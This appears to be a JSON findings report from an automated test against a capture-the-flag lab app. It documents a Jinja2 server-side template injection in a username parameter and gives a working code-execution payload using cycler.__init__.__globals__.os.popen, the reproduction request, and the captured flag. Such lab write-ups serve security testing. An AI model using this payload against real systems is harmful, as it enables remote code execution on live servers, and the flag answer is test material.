@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:27:34.276997+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "12988cef-3861-4ca0-8932-b611cee3b0fc",
+      "timestamp": "2026-04-12T21:27:34.276889+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Jinja2 \u2014 RCE / Flag Extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35363/?username=",
+      "description": "The `username` query parameter is rendered directly inside a Jinja2 template without sanitization. An attacker can inject template expressions that are evaluated server-side, enabling arbitrary code execution. The Jinja2 built-in `cycler` object exposes `__globals__` which includes the `os` module, providing a clean RCE primitive without needing Flask-specific globals.",
+      "evidence": "Request: GET /?username={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}\nResponse body: Welcome flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}!\n\nCTF FLAG: flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:35363/?username={{cycler.__init__.__globals__.os.popen('cat%20flag.txt').read()}} HTTP/1.1\nHost: 172.17.0.1:35363",
+        "expected": "flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "84cceb47-2aa9-4e13-9c67-34c0a5c7a4b8",
+      "timestamp": "2026-04-12T21:27:46.392776+00:00",
+      "title": "CTF App Architecture",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] --> App[\"Python/Uvicorn App :35363\"]\n  App --> Template[\"Jinja2 Template Renderer\"]\n  Template --> FS[\"File System flag.txt\"]\n  App --> OS[\"os module via cycler.__init__.__globals__\"]\n  OS --> FS\n  style FS fill:#f66"
+    }
+  ]
+}
